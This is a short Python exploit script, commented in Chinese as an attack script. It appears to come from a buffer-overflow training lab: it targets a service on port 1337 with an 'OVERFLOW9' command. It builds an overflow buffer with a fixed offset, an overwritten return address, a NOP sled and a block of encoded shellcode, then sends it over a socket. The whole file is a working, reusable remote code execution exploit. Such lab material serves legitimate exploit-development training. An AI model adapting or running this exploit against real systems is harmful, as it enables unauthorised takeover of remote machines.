#coding=utf-8
#!/usr/bin/python

#攻击脚本

import socket

ip = "10.10.16.52"
port = 1337

prefix = "OVERFLOW9 "
offset = 1514 
overflow = "A" * offset
retn = "\xaf\x11\x50\x62"

padding = "\x90" * 16

buf = ""
buf+="\xdb\xd1\xd9\x74\x24\xf4\xbb\xb9\xdc\x9e\x34\x58\x2b\xc9\xb1"
buf+="\x52\x31\x58\x17\x03\x58\x17\x83\x51\x20\x7c\xc1\x5d\x31\x03"
buf+="\x2a\x9d\xc2\x64\xa2\x78\xf3\xa4\xd0\x09\xa4\x14\x92\x5f\x49"
buf+="\xde\xf6\x4b\xda\x92\xde\x7c\x6b\x18\x39\xb3\x6c\x31\x79\xd2"
buf+="\xee\x48\xae\x34\xce\x82\xa3\x35\x17\xfe\x4e\x67\xc0\x74\xfc"
buf+="\x97\x65\xc0\x3d\x1c\x35\xc4\x45\xc1\x8e\xe7\x64\x54\x84\xb1"
buf+="\xa6\x57\x49\xca\xee\x4f\x8e\xf7\xb9\xe4\x64\x83\x3b\x2c\xb5"
buf+="\x6c\x97\x11\x79\x9f\xe9\x56\xbe\x40\x9c\xae\xbc\xfd\xa7\x75"
buf+="\xbe\xd9\x22\x6d\x18\xa9\x95\x49\x98\x7e\x43\x1a\x96\xcb\x07"
buf+="\x44\xbb\xca\xc4\xff\xc7\x47\xeb\x2f\x4e\x13\xc8\xeb\x0a\xc7"
buf+="\x71\xaa\xf6\xa6\x8e\xac\x58\x16\x2b\xa7\x75\x43\x46\xea\x11"
buf+="\xa0\x6b\x14\xe2\xae\xfc\x67\xd0\x71\x57\xef\x58\xf9\x71\xe8"
buf+="\x9f\xd0\xc6\x66\x5e\xdb\x36\xaf\xa5\x8f\x66\xc7\x0c\xb0\xec"
buf+="\x17\xb0\x65\xa2\x47\x1e\xd6\x03\x37\xde\x86\xeb\x5d\xd1\xf9"
buf+="\x0c\x5e\x3b\x92\xa7\xa5\xac\x97\x26\xac\xf6\xc0\x4a\xae\x17"
buf+="\x4d\xc2\x48\x7d\x7d\x82\xc3\xea\xe4\x8f\x9f\x8b\xe9\x05\xda"
buf+="\x8c\x62\xaa\x1b\x42\x83\xc7\x0f\x33\x63\x92\x6d\x92\x7c\x08"
buf+="\x19\x78\xee\xd7\xd9\xf7\x13\x40\x8e\x50\xe5\x99\x5a\x4d\x5c"
buf+="\x30\x78\x8c\x38\x7b\x38\x4b\xf9\x82\xc1\x1e\x45\xa1\xd1\xe6"
buf+="\x46\xed\x85\xb6\x10\xbb\x73\x71\xcb\x0d\x2d\x2b\xa0\xc7\xb9"
buf+="\xaa\x8a\xd7\xbf\xb2\xc6\xa1\x5f\x02\xbf\xf7\x60\xab\x57\xf0"
buf+="\x19\xd1\xc7\xff\xf0\x51\xe7\x1d\xd0\xaf\x80\xbb\xb1\x0d\xcd"
buf+="\x3b\x6c\x51\xe8\xbf\x84\x2a\x0f\xdf\xed\x2f\x4b\x67\x1e\x42"
buf+="\xc4\x02\x20\xf1\xe5\x06";




payload = buf
postfix = ""

buffer = prefix + overflow + retn + padding + payload + postfix

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

try:
  s.connect((ip, port))
  print("Sending evil buffer...")
  s.send(bytes(buffer + "\r\n", "latin-1"))
  print("Done!")
except:
  print("Could not connect.")

